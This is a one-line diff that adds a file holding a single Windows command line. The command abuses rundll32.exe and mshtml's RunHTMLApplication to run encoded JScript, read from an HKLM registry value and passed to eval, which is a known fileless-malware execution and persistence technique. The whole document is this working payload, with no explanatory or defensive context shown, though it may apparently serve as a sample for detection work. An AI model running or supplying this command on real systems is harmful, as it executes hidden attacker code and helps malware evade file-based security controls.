@@ -1,0 +1,1 @@
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\74script language=jscript.encode>"+eval((new%20ActiveXObject("WScript.Shell")).RegRead("HKLM\\d"))+"\74/script>")
